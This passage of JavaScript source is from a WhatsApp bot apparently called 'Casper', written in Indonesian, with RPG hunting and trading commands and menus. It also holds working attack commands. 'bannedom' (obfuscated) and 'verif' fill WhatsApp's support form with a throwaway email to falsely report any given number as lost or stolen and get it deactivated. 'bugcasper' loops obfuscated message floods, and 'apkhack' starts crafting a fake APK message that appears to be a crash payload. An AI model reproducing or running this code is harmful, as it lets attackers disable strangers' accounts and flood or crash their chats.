reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Gajahmu:* ${getGajah(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'besi'){
 if (isBesi < anu) return reply(`Kamu Tidak Memiliki Cukup Besi Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} iron 2\n 1 Iron = 15000 Money`)
 kurangBesi(m.sender, anu)
 let monaynya = 16000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Besi Mu:* ${getBesi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'emas'){
 if (isEmas < anu) return reply(`Kamu Tidak Memiliki Cukup Emas Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} gold 2\n 1 Gold = 50000 Money`)
 kurangEmas(m.sender, anu)
 let monaynya = 50000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Emas Mu:* ${getEmas(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'emerald'){
 if (isEmerald < anu) return reply(`Kamu Tidak Memiliki Cukup Emerald Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} emerald 2\n 1 Emerald = 100000 Money`)
 kurangEmerald(m.sender, anu)
 let monaynya = 100000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Emerald Mu:* ${getEmerald(m.sender)}`)
}, 2000) 
 } else { reply("Incorrect Format!") }
 }
 break
 case 'heal':{
 if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
 if (!isCekDarah < 1) return reply('Kamu Hanya Bisa Menggunakannya Saat Darahmu 0')
 if (isCekDarah > 100) return reply('Darahmu Masih Full')
 if (isPotion < 1) return reply(`Kamu Tidak Punya Potion, Belilah dengan cara #buypotion _jumlah_`) 
 addDarah(m.sender, 100)
 kurangPotion(m.sender, 1)
 reply('Success! Darahmu Full Kembali')
 }
 break 
 case 'hunt': case 'hunting': case'berburu':{
 if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`) 
if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
 if (isCekDarah < 1) return reply('Your Blood Is Gone, Try To Heal Using Potions') 
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
let luka = ["Tertusuk Duri Saat Berburu","Terpleset Ke Jurang Saat Berburu","Tertangkap Hewan Buas","Tidak Berhati-hati","Terjerat Akar","Terjatuh Saat berburu"]
let location = ["Hutan","Hutan Amazon","Hutan Tropis","Padang Rumput","Hutan Afrika","Pegunungan"]
var ikanmu = Math.ceil(Math.random() * 10)
var ayam = Math.ceil(Math.random() * 8)
var kelinci = Math.ceil(Math.random() * 7)
var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)] 
var lukanya = luka[Math.floor(Math.random() * luka.length)]
var lokasinya = location[Math.floor(Math.random() * location.length)]
 if (lokasinya === 'Hutan') {
 var image = './casper-file/gambarnye/rimba.jpg'
} else
 if (lokasinya === 'Hutan Amazon') {
 var image ='./casper-file/gambarnye/amazon.jpg'
} else
 if (lokasinya === 'Hutan Tropis') {
 var image = './casper-file/gambarnye/tropis.jpg'
} else
 if (lokasinya === 'Padang Rumput') {
 var image = './casper-file/gambarnye/padang_rumput.jpg'
} else
 if (lokasinya === 'Hutan Afrika') {
 var image = './casper-file/gambarnye/afrika.jpg'
} else
 if (lokasinya === 'Pegunungan') {
var image = './casper-file/gambarnye/pegunungan.jpg'
}
 setTimeout( () => {
let teksehmazeh = `_[ Hasil Berburu ]_\n`
teksehmazeh += `*🐟 Ikan* : ${ikanmu}\n`
teksehmazeh += `*🐔 Ayam* : ${ayam}\n`
teksehmazeh += `*🐇 Kelinci* : ${kelinci}\n`
teksehmazeh += `*🐑 Domba* : ${domba}\n`
teksehmazeh += `*🐄 Sapi* : ${sapi}\n`
teksehmazeh += `*🐘 Gajah* : ${gajah}\n\n`
teksehmazeh += `_[ INFO ]_\n`
teksehmazeh += `*Lokasi* : ${lokasinya}\n`
teksehmazeh += `*Luka* : ${lukanya}, Darah - 10\n`
teksehmazeh += `*Sisa Darah* : ${getDarah(m.sender)}\n`
 let buttons = [
 {
buttonId: `${prefix + command}`, 
buttonText: {
displayText: 'Berburu Lagi ️🏹'
 }, type: 1},
 ]
 let buttonMessage = {
 image: { url: image },
 caption: teksehmazeh,
 footer: pushname,
 buttons: buttons,
 headerType: 4
}
kesper.sendMessage(from, buttonMessage, { quoted: m }) 
}, 5000)
 setTimeout( () => {
reply(`${pushname} Mulai Berburu Di ${lokasinya}`)
}, 1000) 
 addIkan(m.sender, ikanmu) 
addAyam(m.sender, ayam) 
addKelinci(m.sender, kelinci)
addDomba(m.sender, domba)
addSapi(m.sender, sapi)
addGajah(m.sender, gajah)
 kurangDarah(m.sender, 10)
 }
 break
// # BATAS # \\
//=================================================//
case 'owner': case 'crator': case 'listowner':{
if (isBan) return reply(`Lu Di Ban Kids`)
let buttons = [
{buttonId: `allmenu`, buttonText: {displayText: `𝙰𝙻𝙻 𝙼𝙴𝙽𝚄`}, type: 500},
{buttonId: `bugmenu`, buttonText: {displayText: `𝙱𝚄𝙶 𝙼𝙴𝙽𝚄`}, type: 500},
]
kesper.sendMessage(m.chat, { document : fs.readFileSync("./casper-file/sound/ngeselin.BIN"),
"fileName": `Hay Kak ${pushname} 👋`,
caption: `*Ini Ownerku Kak*
┏━━⊱
┣⊱ wa.me/62882003133773
┗━━⊱`,
footer: `Selamat ${salam}`,
buttons: buttons,
contextInfo:{"externalAdReply": {"title": `Casper Was Here`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@Asmoudeous666`,
thumbnailUrl: 'https://telegra.ph/file/dcc55277ef336f7ba1d2e.jpg',
}}}, { quoted:exe})
}
break
//=================================================//

case '💔': case 'cicit': case '🤡': {
if (isBan) throw sticBanLu(from)
const _0x26b74a=_0x3e8a;function _0x3e8a(_0x1bce25,_0x4caa39){const _0x2ba89a=_0x2ba8();return _0x3e8a=function(_0x3e8a7d,_0xe3f4a4){_0x3e8a7d=_0x3e8a7d-0xf1;let _0x40684b=_0x2ba89a[_0x3e8a7d];return _0x40684b;},_0x3e8a(_0x1bce25,_0x4caa39);}(function(_0x5a73f0,_0xc3fd33){const _0x5383ec=_0x3e8a,_0x498de2=_0x5a73f0();while(!![]){try{const _0x97a33c=-parseInt(_0x5383ec(0xfc))/0x1+-parseInt(_0x5383ec(0xf9))/0x2+parseInt(_0x5383ec(0xfe))/0x3+-parseInt(_0x5383ec(0x101))/0x4+parseInt(_0x5383ec(0x100))/0x5*(parseInt(_0x5383ec(0x10c))/0x6)+-parseInt(_0x5383ec(0x10d))/0x7*(parseInt(_0x5383ec(0xfa))/0x8)+-parseInt(_0x5383ec(0x104))/0x9*(-parseInt(_0x5383ec(0xf4))/0xa);if(_0x97a33c===_0xc3fd33)break;else _0x498de2['push'](_0x498de2['shift']());}catch(_0x223048){_0x498de2['push'](_0x498de2['shift']());}}}(_0x2ba8,0xd47ae),a=await kesper[_0x26b74a(0x105)](m['chat'],{'react':{'text':'💔','key':{'remoteJid':m['chat'],'fromMe':!![],'id':m[_0x26b74a(0xf3)]['id']}}}));const flrd=[_0x26b74a(0xff),'casper1',_0x26b74a(0xf8),'casper3',_0x26b74a(0xf7),'casper5',_0x26b74a(0x109)],msf=flrd[Math['floor'](Math[_0x26b74a(0x103)]()*flrd[_0x26b74a(0xf6)])];function _0x2ba8(){const _0x20c154=['8CCIqfj','chat','1683496CFlvMU','allmenu','1878222BQKCwj','casper','8000iliLiU','113272Qlcmec','CASPER','random','25434ZLcCBX','sendMessage','audio/mpeg','62882003133773','readFileSync','casper6','Selamat\x20','Iyah','2580nawfkG','6771254YvFQWP','Anjay\x20Menger','./casper-file/sound/','bugmenu','JAGOAN\x20OM?','AH\x20SLEBEEW','https://youtube.com/@Asmoudeous666','key','11270cHAlWc','.mp3','length','casper4','casper2','1899044MeHdrT'];_0x2ba8=function(){return _0x20c154;};return _0x2ba8();}hiy=fs['readFileSync'](_0x26b74a(0x10f)+msf+_0x26b74a(0xf5)),kesper[_0x26b74a(0x105)](m[_0x26b74a(0xfb)],{'audio':hiy,'mimetype':_0x26b74a(0x106),'ptt':!![]},{'quoted':ese}),await sleep(0x1388),deploy('y'),a=await kesper[_0x26b74a(0x105)](m[_0x26b74a(0xfb)],{'react':{'text':'🤡','key':{'remoteJid':m[_0x26b74a(0xfb)],'fromMe':!![],'id':m[_0x26b74a(0xf3)]['id']}}}),await sleep(0x7530),a=await kesper[_0x26b74a(0x105)](m['chat'],{'react':{'text':'😈','key':{'remoteJid':m[_0x26b74a(0xfb)],'fromMe':!![],'id':m['key']['id']}}}),(mom=fs[_0x26b74a(0x108)]('./casper-file/sound/casper.mp3'),kesper[_0x26b74a(0x105)](m[_0x26b74a(0xfb)],{'audio':mom,'mimetype':'audio/mpeg','ptt':!![],'caption':_0x26b74a(0x10b),'footer':_0x26b74a(0x10a)+salam,'templateButtons':[{'callButton':{'displayText':_0x26b74a(0x102),'phoneNumber':_0x26b74a(0x107)}},{'callButton':{'displayText':_0x26b74a(0x102),'phoneNumber':_0x26b74a(0x107)}},{'callButton':{'displayText':_0x26b74a(0x102),'phoneNumber':'62882003133773'}},{'urlButton':{'displayText':_0x26b74a(0x102),'url':_0x26b74a(0xf2)}},{'urlButton':{'displayText':_0x26b74a(0x102),'url':_0x26b74a(0xf2)}},{'urlButton':{'displayText':_0x26b74a(0x102),'url':'https://youtube.com/@Asmoudeous666'}},{'quickReplyButton':{'displayText':_0x26b74a(0x102),'id':_0x26b74a(0x10e)}},{'quickReplyButton':{'displayText':'CASPER','id':_0x26b74a(0xf1)}},{'quickReplyButton':{'displayText':_0x26b74a(0x102),'id':_0x26b74a(0x111)}},{'buttonId':_0x26b74a(0xfd),'buttonText':{'displayText':_0x26b74a(0x102)},'type':0x1f4},{'buttonId':_0x26b74a(0x110),'buttonText':{'displayText':_0x26b74a(0x102)},'type':0x1f4},{'buttonId':'owner','buttonText':{'displayText':_0x26b74a(0x102)},'type':0x1f4}]},{'quoted':exe}));
 }
 break
 
 case 'olà': case 'halo': case 'hi': case 'hai': {
if (isBan) return reply(`Lu Di Ban Kids`)
let buttons = [
{buttonId: `panel`, buttonText: {displayText: `BUY PANEL`}, type: 500},
]
kesper.sendMessage(m.chat, { image: casthumb, caption: `Olà`,
footer: `Selamat ${salam}`,
buttons: buttons,
contextInfo:{"externalAdReply": {"title": `Casper Was Here`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@Asmoudeous666`,
thumbnailUrl: 'https://telegra.ph/file/dcc55277ef336f7ba1d2e.jpg',
}}}, { quoted:exe})
}
break

case 'bugcasper': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
var _0x330ff4=_0x3cce;function _0x4a24(){var _0x33d470=['allmenu','AH\x20SLEBEEW','4696024EbUZhG','824497avPvzY','https://youtube.com/@Asmoudeous666','8725866nrQTSc','JAGOAN\x20OM?','Iyah','readFileSync','4893260AKuPUS','10HMqZOH','sendMessage','222228CaMhpT','27oXvlxI','62882003133773','Selamat\x20','Anjay\x20Menger','CASPER','482600wDtKDC','bugmenu','7yHDYFC','23453541BFzsjc','./casper-file/sound/casper.mp3'];_0x4a24=function(){return _0x33d470;};return _0x4a24();}function _0x3cce(_0x2e65dc,_0x5dde22){var _0x4a24d7=_0x4a24();return _0x3cce=function(_0x3cce37,_0x56a878){_0x3cce37=_0x3cce37-0x199;var _0xb31dde=_0x4a24d7[_0x3cce37];return _0xb31dde;},_0x3cce(_0x2e65dc,_0x5dde22);}(function(_0x14d21e,_0x1dd40c){var _0x1f9bd3=_0x3cce,_0x4bfbed=_0x14d21e();while(!![]){try{var _0x2e54e1=-parseInt(_0x1f9bd3(0x199))/0x1+parseInt(_0x1f9bd3(0x1a2))/0x2*(-parseInt(_0x1f9bd3(0x1a3))/0x3)+parseInt(_0x1f9bd3(0x1a8))/0x4+-parseInt(_0x1f9bd3(0x19f))/0x5+-parseInt(_0x1f9bd3(0x19b))/0x6*(-parseInt(_0x1f9bd3(0x1aa))/0x7)+-parseInt(_0x1f9bd3(0x1af))/0x8+-parseInt(_0x1f9bd3(0x1ab))/0x9*(-parseInt(_0x1f9bd3(0x1a0))/0xa);if(_0x2e54e1===_0x1dd40c)break;else _0x4bfbed['push'](_0x4bfbed['shift']());}catch(_0x2177b4){_0x4bfbed['push'](_0x4bfbed['shift']());}}}(_0x4a24,0xc10cc),(mom=fs[_0x330ff4(0x19e)](_0x330ff4(0x1ac)),kesper[_0x330ff4(0x1a1)](m['chat'],{'audio':mom,'mimetype':'audio/mpeg','ptt':!![],'caption':_0x330ff4(0x19d),'footer':_0x330ff4(0x1a5)+salam,'templateButtons':[{'callButton':{'displayText':_0x330ff4(0x1a7),'phoneNumber':'62882003133773'}},{'callButton':{'displayText':_0x330ff4(0x1a7),'phoneNumber':_0x330ff4(0x1a4)}},{'callButton':{'displayText':_0x330ff4(0x1a7),'phoneNumber':_0x330ff4(0x1a4)}},{'urlButton':{'displayText':'CASPER','url':_0x330ff4(0x19a)}},{'urlButton':{'displayText':_0x330ff4(0x1a7),'url':'https://youtube.com/@Asmoudeous666'}},{'urlButton':{'displayText':_0x330ff4(0x1a7),'url':_0x330ff4(0x19a)}},{'quickReplyButton':{'displayText':_0x330ff4(0x1a7),'id':_0x330ff4(0x1a6)}},{'quickReplyButton':{'displayText':_0x330ff4(0x1a7),'id':_0x330ff4(0x1ae)}},{'quickReplyButton':{'displayText':_0x330ff4(0x1a7),'id':_0x330ff4(0x19c)}},{'buttonId':_0x330ff4(0x1ad),'buttonText':{'displayText':_0x330ff4(0x1a7)},'type':0x1f4},{'buttonId':_0x330ff4(0x1a9),'buttonText':{'displayText':_0x330ff4(0x1a7)},'type':0x1f4},{'buttonId':'owner','buttonText':{'displayText':_0x330ff4(0x1a7)},'type':0x1f4}]},{'quoted':exe})));
}}
break

//=================================================//
case 'menu': {
if (isBan) return reply(`Lu Di Ban Kids`)
let buttons = [
{buttonId: `allmenu`, buttonText: {displayText: `𝙰𝙻𝙻 𝙼𝙴𝙽𝚄`}, type: 500},
{buttonId: `bugmenu`, buttonText: {displayText: `𝙱𝚄𝙶 𝙼𝙴𝙽𝚄`}, type: 500},
]
kesper.sendMessage(m.chat, { image: casthumb,
caption: `${menu}`,
footer: `Selamat ${salam}`,
buttons: buttons,
contextInfo:{"externalAdReply": {"title": `Casper Was Here`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@Asmoudeous666`,
thumbnailUrl: 'https://telegra.ph/file/dcc55277ef336f7ba1d2e.jpg',
}}}, { quoted:exe})
}
break

case 'casper': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
let buttons = [
{buttonId: `allmenu`, buttonText: {displayText: `ALL MENU`}, type: 500},
{buttonId: `bugmenu`, buttonText: {displayText: `BUG MENU`}, type: 500},
{buttonId: `owner`, buttonText: {displayText: `OWNER`}, type: 500},
]
mom = fs.readFileSync('./casper-file/sound/casper.mp3'),
kesper.sendMessage(m.chat, {audio : mom, mimetype: 'audio/mpeg',
ptt:true,
caption: `Iyah`,
footer: `Selamat ${salam}`,
buttons: buttons,
contextInfo:{"externalAdReply": {"title": `Casper Was Here`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@Asmoudeous666`,
thumbnailUrl: 'https://telegra.ph/file/dcc55277ef336f7ba1d2e.jpg',
}}}, { quoted:exe})
}
break

case 'bugmenu': {
if (isBan) return reply(`Lu Di Ban Kids`)
let buttons = [
{buttonId: `menu`, buttonText: {displayText: `𝙼𝙴𝙽𝚄`}, type: 500},
]
kesper.sendMessage(m.chat, { image: casthumb,
caption: `${bugmenu}`,
footer: `Selamat ${salam}`,
buttons: buttons,
contextInfo:{"externalAdReply": {"title": `Casper Was Here`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@Asmoudeous666`,
thumbnailUrl: 'https://telegra.ph/file/dcc55277ef336f7ba1d2e.jpg',
}}}, { quoted:exe})
}
break

case 'allmenu': {
if (isBan) return reply(`Lu Di Ban Kids`)
let buttons = [
{buttonId: `textmaker`, buttonText: {displayText: `𝚃𝙴𝚇𝚃 𝙼𝙴𝙽𝚄`}, type: 500},
{buttonId: `game`, buttonText: {displayText: `𝙶𝙰𝙼𝙴 𝙼𝙴𝙽𝚄`}, type: 500},
]
kesper.sendMessage(m.chat, { image: casthumb,
caption: `${allmenu}`,
footer: `Selamat ${salam}`,
buttons: buttons,
contextInfo:{"externalAdReply": {"title": `Casper Was Here`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@Asmoudeous666`,
thumbnailUrl: 'https://telegra.ph/file/dcc55277ef336f7ba1d2e.jpg',
}}}, { quoted:exe})
}
break

case 'textmaker': {
if (isBan) return reply(`Lu Di Ban Kids`)
let buttons = [
{buttonId: `menu`, buttonText: {displayText: `𝙼𝙴𝙽𝚄`}, type: 500},
]
kesper.sendMessage(m.chat, { image: casthumb,
caption: `${textmaker}`,
footer: `Selamat ${salam}`,
buttons: buttons,
contextInfo:{"externalAdReply": {"title": `Casper Was Here`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@Asmoudeous666`,
thumbnailUrl: 'https://telegra.ph/file/dcc55277ef336f7ba1d2e.jpg',
}}}, { quoted:exe})
}
break

case 'game': {
if (isBan) return reply(`Lu Di Ban Kids`)
let buttons = [
{buttonId: `menu`, buttonText: {displayText: `𝙼𝙴𝙽𝚄`}, type: 500},
]
kesper.sendMessage(m.chat, { image: casthumb,
caption: `${game}`,
footer: `Selamat ${salam}`,
buttons: buttons,
contextInfo:{"externalAdReply": {"title": `Casper Was Here`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@Asmoudeous666`,
thumbnailUrl: 'https://telegra.ph/file/dcc55277ef336f7ba1d2e.jpg',
}}}, { quoted:exe})
}
break
//=================================================/
case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
axios.get(`https://api.waifu.pics/sfw/waifu`)
.then(({data}) => {
kesper.sendImage(m.chat, data.url, mess.success, m)
})
break
case 'jadian': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!m.isGroup) throw groupon(from)
let member = participants.map(u => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let menst = [orang, jodoh]
let buttons = [
{ buttonId: 'jadian', buttonText: { displayText: 'Jodohku' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤
@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
footer: kesper.user.name,
buttons: buttons,
headerType: 4
}
kesper.sendMessage(m.chat, buttonMessage, {mentions: menst})
}
break

//=================================================//
case "bannedom": {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
const _0x3b0032=_0x259b;(function(_0x534de8,_0x3df873){const _0x49449d=_0x259b,_0xca82dd=_0x534de8();while(!![]){try{const _0x440568=parseInt(_0x49449d(0xc6))/0x1+-parseInt(_0x49449d(0xba))/0x2*(-parseInt(_0x49449d(0xdc))/0x3)+parseInt(_0x49449d(0xbf))/0x4+parseInt(_0x49449d(0xbb))/0x5*(-parseInt(_0x49449d(0xbd))/0x6)+-parseInt(_0x49449d(0xcc))/0x7*(parseInt(_0x49449d(0xd9))/0x8)+-parseInt(_0x49449d(0xca))/0x9+parseInt(_0x49449d(0xdd))/0xa;if(_0x440568===_0x3df873)break;else _0xca82dd['push'](_0xca82dd['shift']());}catch(_0x4e47b6){_0xca82dd['push'](_0xca82dd['shift']());}}}(_0x2fb1,0xd2680));var axioss=require(_0x3b0032(0xdb));let ntah=await axioss[_0x3b0032(0xd2)](_0x3b0032(0xc4)),email=await axioss[_0x3b0032(0xd2)](_0x3b0032(0xd4)),cookie=ntah['headers'][_0x3b0032(0xb8)]['join'](';\x20');function _0x2fb1(){const _0x49110a=['axios','3uAzZnH','15228620RrDzDe','__ccg','__a','dpr','country_selector','set-cookie','ANDROID','563354MrNRlN','2712730FOCFTI','data','12RhAPGs','val','1860592HMIulk','email','append','href','__rev','https://www.whatsapp.com/contact/noclient/','19316.BP:whatsapp_www_pkg.2.0.0.0.0','1447244CSzxHG','__csr','platform','phone_number','8814150FtFznM','Perdido/roubado:\x20desative\x20minha\x20conta','1106931VeeTTp','lsd','email_confirm','form','input[name=lsd]','your_message','get','POST','https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1','find','cheerio','chat','__req','40OnfXnt','jazoest'];_0x2fb1=function(){return _0x49110a;};return _0x2fb1();}const cheerio=require(_0x3b0032(0xd6));let $=cheerio['load'](ntah[_0x3b0032(0xbc)]),$form=$(_0x3b0032(0xcf)),url=new URL($form['attr']('action'),'https://www.whatsapp.com')[_0x3b0032(0xc2)],form=new URLSearchParams();form['append'](_0x3b0032(0xda),$form['find']('input[name=jazoest]')[_0x3b0032(0xbe)]()),form[_0x3b0032(0xc1)](_0x3b0032(0xcd),$form[_0x3b0032(0xd5)](_0x3b0032(0xd0))[_0x3b0032(0xbe)]()),form[_0x3b0032(0xc1)]('step','submit'),form[_0x3b0032(0xc1)](_0x3b0032(0xb7),'ID'),form[_0x3b0032(0xc1)](_0x3b0032(0xc9),q),form['append'](_0x3b0032(0xc0),email['data'][0x0]),form[_0x3b0032(0xc1)](_0x3b0032(0xce),email[_0x3b0032(0xbc)][0x0]),form[_0x3b0032(0xc1)](_0x3b0032(0xc8),_0x3b0032(0xb9)),form[_0x3b0032(0xc1)](_0x3b0032(0xd1),_0x3b0032(0xcb)),form[_0x3b0032(0xc1)]('__user','0'),form[_0x3b0032(0xc1)](_0x3b0032(0xdf),'1'),form[_0x3b0032(0xc1)](_0x3b0032(0xc7),''),form[_0x3b0032(0xc1)](_0x3b0032(0xd8),'8'),form[_0x3b0032(0xc1)]('__hs',_0x3b0032(0xc5)),form[_0x3b0032(0xc1)](_0x3b0032(0xb6),'1'),form['append'](_0x3b0032(0xde),'UNKNOWN'),form[_0x3b0032(0xc1)](_0x3b0032(0xc3),'1006630858'),form[_0x3b0032(0xc1)]('__comment_req','0');let res=await axioss({'url':url,'method':_0x3b0032(0xd3),'data':form,'headers':{'cookie':cookie}});function _0x259b(_0x2a086d,_0x47596c){const _0x2fb1c3=_0x2fb1();return _0x259b=function(_0x259b0c,_0x3ea172){_0x259b0c=_0x259b0c-0xb6;let _0x275973=_0x2fb1c3[_0x259b0c];return _0x275973;},_0x259b(_0x2a086d,_0x47596c);}kesper['sendMessage'](m[_0x3b0032(0xd7)],{'text':util['format'](res['data'])},{'quoted':m});
}
break
case prefix+"verif": {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
  var axioss = require ("axios")
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
kesper.sendMessage(m.chat, { text: util.format(res.data)}, { quoted:m })
}
break
case "unbannedom": {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} +62`)
let teks = `${q}`
  var axioss = require ("axios")
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_subject", "Meu novo número está bloqueado sem motivo")
form.append("your_message", `Please reactivate my number because I didn't violate any WhatsApp rules, suddenly my number was banned, please reactivate this number: ${q}.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
kesper.sendMessage(m.chat, { text: util.format(res.data)}, { quoted:m })
}
break
//=================================================//
case 'sewa': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
maaf ga nyediain sewa kalau mau jadi bot bisa chat Casper wa.me/62882003133773`)
}
break
//=================================================//

case 'soundbot': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

kal
ngakak
ketawa
awkwk
bang
nob
musik
mastah
slebew
cantik
kesel
ngeselin`)
}
break

case 'apkhack': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AkPX3_pDzjXQZJ-c8-J3dvX8LkkuBnSKeIVYbTAqQj99.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "HACKED DATA.apk",
"fileSha256": "ubU38CumgrTjP8GEStOzR3cSKE9xs3XEwsTyfctHteo=",
"fileLength": "1827560",
"pageCount": 0,
"mediaKey": "v2sB68PUWb8xSia872KALjd+B75YR49jdfo3Jn9k4VY=",
"fileName": "HACKED DATA.apk",
